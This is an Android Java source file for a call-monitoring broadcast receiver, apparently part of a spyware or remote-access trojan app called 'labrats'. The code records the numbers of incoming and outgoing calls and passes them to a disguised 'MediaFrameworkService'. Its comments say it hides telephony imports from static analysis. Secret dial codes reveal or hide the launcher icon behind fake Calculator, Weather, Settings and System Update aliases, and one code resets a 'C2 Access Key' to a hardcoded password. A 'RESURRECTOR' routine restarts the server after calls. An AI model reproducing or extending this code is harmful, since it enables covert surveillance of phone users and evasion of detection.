package com.labs.labrats;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

/**
 * Broadcast receiver for detecting incoming and outgoing calls.
 * Uses API Virtualization to hide telephony imports from static analysis.
 */
public class TelephonyState extends BroadcastReceiver {

    private static final String TAG = "TelephonyState";
    private static final String TM_CLASS = "android.telephony.TelephonyManager";

    // Track call state using virtualized constants
    private static int lastState = 0; // TelephonyManager.CALL_STATE_IDLE
    private static boolean isIncoming = false;
    private static String savedNumber = null;

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        Log.d(TAG, "onReceive: " + action);

        // Virtualized Action Check
        if ("android.intent.action.PHONE_STATE".equals(action)) {
            handlePhoneStateChange(context, intent);
        } else if (Intent.ACTION_NEW_OUTGOING_CALL.equals(action)) {
            handleOutgoingCall(context, intent);
        }
    }

    private void handlePhoneStateChange(Context context, Intent intent) {
        String stateStr = intent.getStringExtra("state");
        String number = intent.getStringExtra("incoming_number");

        int state = 0; // IDLE

        if ("IDLE".equals(stateStr)) {
            state = 0;
        } else if ("OFFHOOK".equals(stateStr)) {
            state = 2; // OFFHOOK
        } else if ("RINGING".equals(stateStr)) {
            state = 1; // RINGING
        }

        onCallStateChanged(context, state, number);
    }

    private void handleOutgoingCall(Context context, Intent intent) {
        savedNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
        isIncoming = false;
        Log.d(TAG, "Outgoing call to: " + savedNumber);

        if ("*#1337#".equals(savedNumber)) {
            setResultData(null);
            restoreLauncher(context);
            
            Intent i = new Intent(context, MainActivity.class);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(i);
        } else if ("*#1337*0#".equals(savedNumber)) {
            // EMERGENCY PASSWORD RESET: Resets C2 Access Key to 'admin1337'
            setResultData(null);
            context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                    .edit()
                    .remove("c2_password_hash")
                    .remove("c2_password_salt")
                    .putString("c2_password", "admin1337")
                    .apply();
            
            FirebaseConfig.logActivity("SECURITY_ALERT: Hardware-triggered password reset sequence (Dial Code)");
            android.widget.Toast.makeText(context, "SECURITY: C2 Access Key Reset to Default", android.widget.Toast.LENGTH_LONG).show();
            
            restoreLauncher(context);
            Intent i = new Intent(context, MainActivity.class);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(i);
        }
    }

    private void restoreLauncher(Context context) {
        android.content.pm.PackageManager pm = context.getPackageManager();
        String pkg = context.getPackageName();
        String base = "com.labs.labrats";
        
        android.content.ComponentName mainAlias = new android.content.ComponentName(pkg, base + ".LauncherAlias");
        android.content.ComponentName updateAlias = new android.content.ComponentName(pkg, base + ".SystemUpdateAlias");
        android.content.ComponentName calcAlias = new android.content.ComponentName(pkg, base + ".CalculatorAlias");
        android.content.ComponentName weatherAlias = new android.content.ComponentName(pkg, base + ".WeatherAlias");
        android.content.ComponentName settingsAlias = new android.content.ComponentName(pkg, base + ".SettingsAlias");

        pm.setComponentEnabledSetting(mainAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
        pm.setComponentEnabledSetting(updateAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
        pm.setComponentEnabledSetting(calcAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
        pm.setComponentEnabledSetting(weatherAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
        pm.setComponentEnabledSetting(settingsAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
    }

    private void onCallStateChanged(Context context, int state, String incomingNumber) {
        if (state == lastState) return;

        int previousState = lastState;
        lastState = state;

        Log.d(TAG, "Call state changed: " + previousState + " -> " + state + ", number: " + incomingNumber);

        switch (state) {
            case 1: // RINGING
                isIncoming = true;
                savedNumber = incomingNumber;
                onIncomingCallReceived(context, savedNumber);
                break;

            case 2: // OFFHOOK
                if (isIncoming) {
                    onIncomingCallAnswered(context, savedNumber);
                } else {
                    onOutgoingCallStarted(context, savedNumber);
                }
                break;

            case 0: // IDLE
                if (previousState == 1) {
                    onMissedCall(context, savedNumber);
                } else if (previousState == 2) {
                    onCallEnded(context, savedNumber, isIncoming);
                    resurrectServerIfNeeded(context);
                }
                isIncoming = false;
                savedNumber = null;
                break;
        }
    }

    private void onIncomingCallReceived(Context context, String number) {
        sendCallStateToService(context, 1, number);
    }

    private void onIncomingCallAnswered(Context context, String number) {
        sendCallStateToService(context, 2, number);
    }

    private void onOutgoingCallStarted(Context context, String number) {
        sendCallStateToService(context, 2, number);
    }

    private void onMissedCall(Context context, String number) {
        sendCallStateToService(context, 0, number);
    }

    private void onCallEnded(Context context, String number, boolean incoming) {
        sendCallStateToService(context, 0, number);
    }

    private void sendCallStateToService(Context context, int callState, String phoneNumber) {
        try {
            Intent serviceIntent = new Intent(context, MediaFrameworkService.class);
            serviceIntent.setAction("CALL_STATE_CHANGED");
            serviceIntent.putExtra("call_state", callState);
            serviceIntent.putExtra("phone_number", phoneNumber);

            androidx.core.content.ContextCompat.startForegroundService(context, serviceIntent);
        } catch (Exception e) {
            Log.e(TAG, "Error sending call state to service", e);
        }
    }

    private void resurrectServerIfNeeded(Context context) {
        Log.d(TAG, "RESURRECTOR: Verifying server health after call...");
        Intent serviceIntent = new Intent(context, WorkManager_Sync.class);
        serviceIntent.setAction("START");
        androidx.core.content.ContextCompat.startForegroundService(context, serviceIntent);
    }
}
